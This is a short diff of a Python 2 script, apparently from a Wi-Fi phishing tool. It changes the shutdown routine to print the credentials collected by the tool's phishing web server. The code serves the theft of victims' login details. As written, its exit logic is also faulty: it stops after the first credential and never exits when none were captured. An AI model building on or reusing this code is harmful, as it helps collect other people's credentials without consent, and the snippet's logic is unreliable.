@@ -187,7 +187,8 @@ def shutdown(template=None, network_manager=None):
         template.remove_extra_files()
 
     print '[' + R + '!' + W + '] Closing'
-    sys.exit(0)
+    for c in phishinghttp.creds:
+        sys.exit('[' + R + '+' + W + '] Captured credentials:' + R + c)
 
 
 def set_fw_rules():
